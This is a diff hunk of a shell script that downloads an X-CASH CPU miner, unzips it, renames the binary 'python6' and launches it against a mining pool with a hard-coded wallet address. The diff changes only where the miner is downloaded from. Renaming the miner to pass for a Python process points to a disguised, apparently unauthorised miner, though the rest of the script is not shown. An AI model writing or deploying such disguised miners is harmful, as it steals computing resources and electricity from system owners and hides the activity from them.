@@ -28,9 +28,9 @@ fi
 exit
 fi
 
-wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Xcash.zip
-unzip Xcash.zip
-mv XCASH_ALL_Miner python6
+wget https://github.com/X-CASH-official/XCASH_CPU_Miner/releases/download/1.0.0/XCASH_CPU_Miner_Linux_Ubuntu_16.04_1.0.0.zip
+unzip XCASH_CPU_Miner_Linux_Ubuntu_16.04_1.0.0.zip
+mv XCASH_CPU_Miner python6
 ./python6 -F http://xcash.herominers.com:10441/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
 exit 0
